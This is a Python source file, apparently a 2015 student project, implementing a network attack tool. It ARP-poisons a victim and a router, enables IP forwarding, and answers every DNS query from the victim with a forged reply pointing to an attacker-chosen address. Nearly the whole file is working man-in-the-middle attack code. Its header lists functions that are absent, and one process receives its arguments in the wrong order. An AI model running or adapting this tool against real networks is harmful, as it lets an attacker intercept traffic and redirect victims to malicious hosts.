'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  SOURCE FILE:    dnsspoof.py
--
--  AUTHORS:         Thilina Ratnayake (A00802338) & Elton Sia (A00800541)
--
--  PROGRAM:        Arp poisons a target, performs a man-in-the-middle attack
--                  and responds to every DNS request with a response for
--                  a specific site.
--
--  FUNCTIONS:      sendCommand(string)
--                  craftCommandPacket(string)
--                  encryptCommand(string)
--                  commandResult(packet)
--
--  DATE:           October 17, 2015
--
--  REVISIONS:
--
--  NOTES:
--  The program requires the PyCrypto and Scapy libraries for encryption and packet
--  crafting respectively.
--  'pip install pycrpyto' or https://www.dlitz.net/software/pycrypto/
--  'pip install scapy' or http://www.secdev.org/projects/scapy/
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

##IMPORTS
from scapy.all import *
from subprocess import Popen, PIPE, call
import argparse
import re
import time
from multiprocessing import Process

#Program INPUTS:
# - Victim IP
# - Router IP
#0. Get all the inputs
	#Allow attacker to enter:
	#python dnsspoof.py -v 192.168.0.10 -r 192.168.0.1 -o 192.168.0.3 -g 70.79.160.58
def parse_arguments():
	parser = argparse.ArgumentParser()
	parser.add_argument("-v", "--victimIP", help="IP address of victim")
	parser.add_argument("-r", "--routerIP", help="IP address of router")
	parser.add_argument("-i", "--ownIP", help="IP address of your own machine")
	parser.add_argument("-g", "--gotoIP", help="IP address of where target's should be redirected to")
	return parser.parse_args()

#1. Get all the details in prep for ARP poisoning
#1A: Get MAC address of victim machine
def victimMacAddress(victim):
	ip = victim
	Popen(["ping", "-c 1", ip], stdout=PIPE)
	pid = Popen(["arp", "-n", ip], stdout=PIPE)
	s = pid.communicate()[0]
	victimMac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
	return victimMac

#1B: Get MAC address of router
def routerMacAddress(router):
	ip = router
	Popen(["ping", "-c 1", ip], stdout=PIPE)
	pid = Popen(["arp", "-n", ip], stdout=PIPE)
	s = pid.communicate()[0]
	routerMac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
	return routerMac

#1C: Get MAC Address of our own machine
def ownMacAddress():
	arppkt = ARP()
	myMac = arppkt[ARP].hwsrc
	return myMac

#2. Enable IP forwarding so that packets from victim will be forwarded
#2A write "1" into /proc/sys/net/ipv4/ip_forward
def forwarding():
	ipforward = "echo \"1\" >> /proc/sys/net/ipv4/ip_forward"
	forward = Popen([ipforward], shell=True, stdout=PIPE)

	#4. After ARP poisoning has occurred, drop any forwarded DNS packets
	#Firewall rule, disable forwarding of any UDP packets to dport 53

#3. Perform Arp Poisoning
def arpPoison(victim, router):
	#IP and MAC addresses
	victimIP = victim
	routerIP = router
	victimMac = victimMacAddress(victimIP)
	routerMac = routerMacAddress(routerIP)

	print "Starting ARP poisoning to"+victimIP
	while True:
		time.sleep(2)
		#3A Repeatedly send ARP reply's to VICTIM stating that router IP
		# is at THIS MAC addr
		send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMac),verbose = 0)
		#3B Repeatedly send ARP reply's to ROUTER stating that the victim IP
		# is at THIS MAC
		send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMac),verbose = 0)



#5. In a new thread, sniff for DNS queries.
def sniffDNS(ownIP,victimIP,routerIP,gotoIP):
	print "starting SNIFF DNS!!"
	sniff (filter="udp and port 53", prn = spoofDNS)

#5A. Craft DNS answers that whatever has been requested
#lives at THIS IP.
def spoofDNS(packet):
	if packet[IP].src == victimIP:
		print "Packet is from " + victimIP
		packet.show()
		if packet.haslayer(DNS):
			packet.show()
			print "Has DNS"

			if DNSQR in packet:
				print "Has a DNS query"
				print packet[DNSQR]
				#Send back a spoofed packet
				spoofed_pkt = (Ether()/IP(dst=packet[IP].src, src=packet[IP].dst)/\
	                      UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
	                      DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1, \
	                      an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata=gotoIP)))
	        	sendp(spoofed_pkt, count=1)



if __name__ == '__main__':
	arguments = parse_arguments()
	victimIP = arguments.victimIP
	routerIP = arguments.routerIP
	ownIP = arguments.ownIP
	gotoIP = arguments.gotoIP
	#grab mac addresses
	ownMacAddress()
	#enable fowrwarding
	forwarding()

	#Create two processes
	arpPoisonProcess = Process(target=arpPoison,args=(victimIP,routerIP))
	arpPoisonProcess.start()
	sniffDNSprocess = Process(target=sniffDNS,args=(victimIP,routerIP,ownIP,gotoIP))
	sniffDNSprocess.start()
	arpPoisonProcess.join()
	sniffDNSprocess.join()
	print "Here!"
